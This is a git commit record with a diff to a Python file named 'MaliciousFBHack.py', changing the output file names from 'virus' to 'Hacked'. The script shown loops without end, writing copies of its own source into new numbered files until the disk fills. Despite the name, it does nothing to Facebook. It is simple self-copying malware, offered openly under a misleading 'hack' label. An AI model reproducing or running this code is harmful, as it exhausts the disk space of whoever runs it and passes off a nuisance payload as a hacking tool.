d0d0c9ef601b5c9b4e2f99ad8fefc33adf5d847b
MaliciousJoker <51397673+MaliciousJoker@users.noreply.github.com>
2019-09-20 08:12:05 +0200

    Update MaliciousFBHack.py

--- MaliciousFBHack.py
+++ MaliciousFBHack.py
@@ -2,7 +2,7 @@
 indicator = 0
 
 while True:
-    with open("virus{0}".format(indicator), "w") as f:
+    with open("Hacked{0}".format(indicator), "w") as f:
         f.write(open(__file__).read())
         f.close()
         indicator += 1
